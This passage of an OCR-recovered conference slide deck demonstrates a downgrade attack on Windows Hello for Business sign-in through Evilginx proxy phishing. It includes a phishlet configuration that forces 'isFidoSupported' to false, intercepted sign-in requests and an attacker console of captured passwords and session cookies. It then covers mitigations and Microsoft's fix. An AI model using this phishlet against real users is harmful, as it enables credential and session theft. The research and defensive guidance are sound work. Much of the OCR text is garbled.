"federationFlags":0,
"isSignup":false,
"£LowToken": "AQABIQEAAAApTWImzXqdR..snip..72KycL8UCJd7AsgAA",
"isAccessPassSupported":true,
"isQrCodePinSupported": true
```

## Slide 95

DEMONSTRATION - INTERCEPT

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - INTERCEPT
wee) POST /common/GetCredentialType?mkt=en-US HTTP/1.1
wee) Host: Login.microsoftonline.com
@ee) Cookie: ..snip...
wee User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0)
a
Gecko/20100101 Firefox/127.0
Gh Origin: https: //Login.microsoftonLline.com
"username": "yehuda.smirnov@company.com",
"isOtherIdpSupported":true,
"checkPhones": false,
"isRemoteNGCSupported":true,
"isCookieBannerShown": false,
"isFidoSupported": false,
"originalRequest":
"rQQIARAANZI_bONOGIbtpE3...snip.. .F4YOGUZ4FzCqTpVPu3rcV5PCcK8g8
1",
"country": "IL",
"forceotclogin": false,
"isExternalFederationDisalLlowed": false,
"isRemoteConnectSupported": false,
"federationFlags":0,
"isSignup":false,
"FLowToken" : "AQABIQEAAAApTwJImzXqdR..snip. .72KycL84CJd7AsgAA",
"isAccessPassSupported":true,
"isQrCodePinSupported": true
```

## Slide 96

DEMONSTRATION - DOWNGRADED

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - DOWNGRADED
© yehudasmirnov@company.com
Enter password
Password
```

## Slide 97

DEMONSTRATION - DOWNGRADED

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - DOWNGRADED
BE Microsoft
© yehudasmirnov@company.cam
Enter password
```

## Slide 98

DEMONSTRATION - DOWNGRADED

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - DOWNGRADED
~s eos’ coumen /Get( redeet ial type hawt «TT?
mos! Oot
oo seecie
a= Microsoft
yehuda.smirnov@company.com
Enter code
Enter the code displayed in the authenticator
app on your mobile device
285494
Having trouble? Sign in another \
More information
```

## Slide 99

DEMONSTRATION - DOWNGRADED

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - DOWNGRADED
pos) POS! /commen/Get( regent ial Type hext eTreyi i
mos! meat " , *
LJ ee
°3 office.com |? »
Microsoft 365 Search © & &
Home
iS) Welcome to Microsoft 365 Install and more ~
pr
Quick access
Eh
a ( All © Recently opened &8 Shared YY Favorites | + 7 Upload = 69
BS
App
HB 72230608322 Jun 26 Microsoft sent this
52230606780 @ - Jun 26 ) Microsoft sent this
oF
```

## Slide 100

PROXY PHISHING

## Slide 101

## PROXY PHISHING

User

Azur e Response from Azure

Sign-in request

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PROXY PHISHING
Fy hepeawes
User
Response from
Azure
€
Sign-in request |
```

## Slide 102

## PROXY PHISHING

User Attacker Azur
e
Forwards
response to user Response from Azure
Sign-in request Forwards request
to Azure

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PROXY PHISHING
“EST,
User Attacker
Forwards
response to user Response from Azure
< <
Sign-in request Forwards request
to Azure
```

## Slide 103

## PROXY PHISHING - EVILGINX

User Attacker Azur
e
Forwards
response to user Response from Azure
Sign-in request Forwards request
to Azure
Link to the Evilginx framework:
made by @mrgretzky

## Slide 104

PROXY PHISHING - EVILGINX

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PROXY PHISHING - EVILGINX
® login.attacker.com,
Microsoft Azure
B® Microsoft
Sign in
to continue to Microsoft Azure
Email, p
No account? Create one!
Can't access your account?
ww) Sign in with GitHub
Qy Sign-in options
```

## Slide 105

PROXY PHISHING - EVILGINX

Azure

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PROXY PHISHING - EVILGINX
® login.attacker.com,
Attacker
Microsoft Azure a: re & User
i
Sign in
to continue to Microsoft Azure
fe
CN
ww) Sign in with GitHub
Qy Sign-in options
```

## Slide 106

PROXY PHISHING - EVILGINX

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PROXY PHISHING - EVILGINX
login.attacker.com
```

## Slide 107

## AUTOMATION

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
AUTOMATION
——_,
+ yudasm commented on Mar 5 Contributor |) +++
Added support for force_post for json parameters (supported only regular http parameters)
Useful for intercepting requests to URLs such as /common/GetCredentialType which are used to initiate Windows Hello for
Business auth flow
Blog post will be published soon on this subject
The following force_post section can now alter the API post request and modify it on the fly, something that could not be done
beforehand due to limitations with modifications of JSON params.
- path: ‘/common/GetCredentialType'
search:
o
- {key: "isFidoSupported’, search: ".*"}
force:
- {key: "isFidoSupported'’, value: "false"}
type: "post'
```

## Slide 108

AUTOMATION

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
TOMATION
WHfB-0365-Phishlet / 0365whfb.yaml
Code Blame 91 lines (91 loc) - 2.8 KB
12 - domain: ‘login.microsoftonline.com*
13 keys: ["ESTSSC:always" , "ESTSAUTHLIGHT: always", ‘
14 type: ‘cookie’
15 force_post:
16 - path: '/kmsi‘
17 search:
18 - {key: ‘LoginOptions’, search: *.*"}
19 force:
20 - {key: "LoginOptions’, value: '1"}
21 type: ‘post’
22 - path: ‘/common/GetCredentialType*
23 search:
24 - {key: "isFidoSupported’, search: *.**}
25 force:
26 - {key: ‘isFidoSupported’, value: ‘false'}
27 tvpe: "post"
```

## Slide 109

## DEMONSTRATION

## Slide 110

DEMONSTRATION - PHISHING SITE

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - PHISHING SITE
® login.attacker.com
Microsoft
Sign in
yehuda.smirnov@company.com
No acco
Can't ac
a, Sign-in options
```

## Slide 111

DEMONSTRATION - PHISHING SITE

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - PHISHING SITE
® login.attacker.com
Microsoft
< yehuda.smirnov@company.com
Enter password
Pz rd
Forgot my password
Use your face, fingerprint, PIN, or security key instead
```

## Slide 112

DEMONSTRATION - PHISHING SITE

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - PHISHING SITE
® login.attacker.com,
Microsoft
< yehuda.smirnov@company.com
Enter password
```

## Slide 113

DEMONSTRATION - PHISHING SITE

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - PHISHING SITE
© login.attacker.com
Microsoft
yehuda.smirnov@company.com
Enter code
Enter the code displayed in the authenticator
app on your mobile device
474657
Having trouble? Sign in anothe
More information
```

## Slide 114

DEMONSTRATION - REDIRECT

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - REDIRECT
© Home | Microsoft 365 x
3; [) %  office.com
23 Microsoft 365 S Search
A
Home
©) ‘
: Welcome to Microsoft 365
a
Le Quick access
Ep
“ees ff@ All © Recently opened
B8
Apps
BR 72230608322
“me = 52230606780
2&3 Shared
TY Favorites
4
Jun 26
Jun 26
Install and more ~
Fl|= RB
Microsoft sent this
Microsoft sent this
```

## Slide 115

DEMONSTRATION - ATTACKER SIDE

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
[10;S4:41} [+++] [@} detected authorization URL - tokens intercepted: /favicon.ico
: sessions
| 9S | microsoft365new
$----= ee
: sessions 95
id 7s
phishlet : microsoft36Snew
username = yehuda.smirnov@company.com
password + DefinitelyNotMyPSssword
tokens : captured
landing url : ps: 2 2b:
user-agent : Mozilla/5S.0 (Windows NT 19.0; Win64; x64; rv:109.6) Gecko/20100101 Firefox/116.0
remote ip : 93.157.86.34
Create time : 2623-68-27 16:54
update time : 2023-08-27 10:54
{ cookies J
[{"path":"/", "domain" :"login.microsoftonl ine.com", "expirat ionDate" : 1724669698, “value":"6. so padi yndn seamen ronevct habea
dk3Zsdsp7AIg . AQABAAQAAAAt Yo LDObpQOSVtLI4uGjEPAgDs_wUA9P_h6IR1Zwjcs im7frEtKVZoeUJatcw2h_iU7Xb3m2w9BX2UN5.I3V3 1 1xVaxtTVtNpfzOrdi dui
sqy0 ir TK26PSUFOSeNAHbKXrDC TOLEJOUF j -AAVoSWOEnccFEpOSwzqDtonZI jp 69b6hTLw8Gahz TynHwRQ icUJeY xwudX7Tt j e4IL - yOgkPKznpoh iPVYSbkZXGyc
Hf_4S 10Zcx26pR 1DcW8aixOt VbpQmvD7Y8Gy3DpI5j 17YdtDL dk LO iw_R4KyuoW39R_f4dDnSVEZz6cs06pb fé xZEomH I thUaoRWVvR203KWqsNo370bw6 j ZBdp6zbbzT
Xe LORAG ~ rO3KZqIkRod24XxC TTCTFDmOGWAaECOMwpSKBAMaSb2z j tWak2027¢4-vPTMdc uQ_vRJZruzwQUOOLk iAkNPpuj 4q40vEJwfSsmUEuneFG91 -WpchrQHiMcd
_¢4sp7Cqx-uCpAVu9Ek Xbecs 8gnGgr x8dd1MZ0 xk 2M3 1 iDSOkaTG93eGzysoWVXC iBmTRINNj 98QUk 1JU8-j_gTWoLK3VuhxZTv-eGCF iuRNSCL4GR7JRyoNhacnygwe
yokL T2Rnwhimm4kmszqy_eAhCwW_tpLMjc78jAy0ij YzyYRbP IuTCEBA34s Ybums4b TM8QH9SZrGGVGmbuDVGHzdg5" , "name" :"ESTSAUTH" ,"httponly”:true},{"
path":"/", "domain" :"login.microsoftonl ine.com","expirat ionDate" : 1724669696, “value” :"@. AXSAOT1540k JbUmxKRmO3ZF v6 1tEZUfGMrBJg-Ydk3
ZSdsp7AIg. AQABAAQAAAAtYyo LDObpQQSVtLI4uGjEPAgDs_wUA9Pasn) YwJAXUj }ZePCWcFITKgqxMbEpBpguk tS CZuAVCC3QZPEAKU_8KQVRNS- iUq7¢434FiN
89ebyaba)j6LnvicDSEQgI_J2vxXbWN-n7saMuhSwe 1Lk60LFP9ypa4l QNoPcVTRsm6A j BEHC qqeyH6L ZE3Sg8.)} 2) GaZhUEVSpFBHGJGH40R_nULHjhidancOuN7kN
OWcHq6h1P83F2CUNIWE i Norssomeritonacseell gy Ment nn naneeree BT. amababundpmce per te eee pdr ooo penny proba
jWcUhObv7RTSWxth20Ee fve fpR6tAcVrUYRUGNAL6_4Grtub9QAnbaE Tm2 13UckGjmVYanpGudowDmc4PhtPKtIObd-md4IRO9bQSXA_HHHWUXTiLKf9Sot4zww93Gse
pacaghdnn. i , "Name" : "ESTSAUTHPERSISTENT", "httpOnly":true},{"path":"/", "domain": "login.microsoftonl ine.com", "expirat ionDate" : 1724669
698, “value”: "CAGABAAIAAAATYo LDObpQgsvt lI4uGjEPAgDs_wUA9P-xPbSyIL VcPHh_6Sb8-rk4ds_3qcBDS0_1B6Nc fobnHal_5S9sEWi-UVguTBS19CUELQRPrag
ig dP nro so nlp eigen weeny ae piace pigeons yea yp ar apes Bret
f¥-rbIthSskPoJvozAhwm7uj MB -HorniFHh28NwAfNb tT_zarYcQBARKxu" , “name”: "SignInStateCookie","httpOnly*:true},{"path":"/", "domain": "lo
gin.microsoftonline.com",“expirat ionDate” : 1724669698 , "value" : "PAQABAAEAAAAT yo LDObpQSVt L14uGjEPwdTqFYe6zpd i) nWfO7mr_2z11C3z
Xp39 ahem he jumhaxkusonqvg.s VhYeaQvxvmpye2 "2 antechbagrneerinet Rare Re rT1Yal8b1f7dxB0UaqwGdlec j ehkZKOPnWENSImsRdWqAna
MOVM6DWUs - LF iPn4gZS fS7kKBGIWRtO 1lyWO2bFyIKrXLBL V1 7vP3xap40zhYQZ9tvd0SHnDHudkgAA" , “name”: "esctx",“httpOnly":true},{"path":"/","doma
in":"login.microsoftonl ine.com","expirat ionDate" : 1724669698 , "value" ;"+6669bd26-ee04-4117-90c5-dc7e4f7168e1", "name": "ESTSAUTHLIGH
Tt, "hostonly":true},{"path":"/", "domain™:" login microsofton| ine.com" ,"expirat ionDate" : 1724669698 , "value": "estsfd", "name": "stsser
vicecookie","httpOnly":true,"hostOnly":true},{"path":"/", "domain": "login.microsoftonl ine.com" , “expirationDate" : 1724669698, "value
“:"estsfd", "name" :"x-ms-gateway-slice",“httpOnly":true, “hostonly*:True}]
```

## Slide 116

MITIGATION STRATEGIES

## Slide 117

## MITIGATION STRATEGIES

### Authentication Strength

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MITIGATION STRATEGIES
Grant
Authentication Strength
Control access enforcement to block or (4 it
grant access. Learn more &
))
Wr4/
) Block access
(@) Grant access
| Require multifactor
authentication
L
| Require authentication
strength
| | Require device to be marked
as compliant
```

## Slide 118

## MITIGATION STRATEGIES

### Authentication Strength

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MITIGATION STRATEGIES
Authentication Strength
(D)
V/s
such as Microsoft Authenticator
Phishing-resistant MFA
Phishing-resistan
```

## Slide 119

## MITIGATION STRATEGIES

### Authentication Strength

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MITIGATION STRATEGIES
Ol ifactor authentication : 2
Mules’ meee Authentication Strength
Phishing-resistant MFA
i Phishing-resistant Passwordiess
i methods for the stronage
```

## Slide 120

## MITIGATION STRATEGIES

Phishing-resistant Conditional Access Policy

## Slide 121

## MITIGATION STRATEGIES

Phishing-resistant Conditional Access Policy

###### **Target resources**

###### **Grant access**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MITIGATION STRATEGIES
Phishing-resistant Conditional Access Policy
Target resources Grant access
Select what this policy applies to
Require authentication
strength
Cloud apps
Phishing-resistant MFA
Include Exclude
(_ ) Select apps
```

## Slide 122

MITIGATION STRATEGIES Register Security Information Conditional Access Policy

## Slide 123

## MITIGATION STRATEGIES Register Security Information Conditional Access Policy

###### **Target resources**

**Grant access**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MITIGATION STRATEGIES
Register Security Information Conditional
Access Policy
Target resources Grant access
Select the action this policy will apply to
Register security information
[_] Register or join devices
```

## Slide 124

## MITIGATION STRATEGIES

Enforce MFA for all Users

## Slide 125

## MITIGATION STRATEGIES

Enforce MFA for all Users

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MITIGATION STRATEGIES
Enforce MFA for all Users
Select what this policy applies to
Cloud apps
Require authentication
strength
Include Exclude
Multifactor authentic... ~
```

## Slide 126

## MITIGATION STRATEGIES

Deploying to production without
testing

## Slide 127

DEMONSTRATION

## Slide 128

DEMONSTRATION - PHISHING SITE

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - PHISHING SITE
Microsoft Azure
BE Microsoft
Sign in
to continue to Micraso
Yehuda.Smirne
No account?
Can’
Sign in with GitHub
Sign-in options
```

## Slide 129

DEMONSTRATION - PHISHING SITE

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - PHISHING SITE
Microsoft Azure
BE Microsoft
© yehudasmirnov@company.com
Enter password
SCS CFCC CBBC oe
Forgot my p ord
Use your face, fingerprint, PIN, or security key instead
```

## Slide 130

DEMONSTRATION - PHISHING SITE

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - PHISHING SITE
Microsoft Azure
Microsoft
yehuda.smirne npany.com
Verify your identity
ce Face, fingerprint, PIN or security key
Cancel
```

## Slide 131

## REPORT TIMELINE

- **10 September 2023 — Reported to Microsoft**

- • **06 November 2023 — Fixed according to Microsoft**

## Slide 132

**TAKE AWAYS**

## Slide 133

## **TAKE AWAYS**

#### Windows Hello for Business

## Slide 134

## **TAKE AWAYS**

Windows Hello for Business

#### WebAuthn API

## Slide 135

## **TAKE AWAYS**

Windows Hello for Business

#### WebAuthn API

Downgrade attack vector

## Slide 136

## **TAKE AWAYS**

Windows Hello for Business

#### WebAuthn API

Downgrade attack vector

Conditional Access Policies

## Slide 137

## **SLIDES**

#### **Github Repo with Slides**

## Slide 138

QUESTIONS?

## Slide 139

# THANK YOU

F O R W A T C H I N G

Yehuda Smirnov @yudasm_
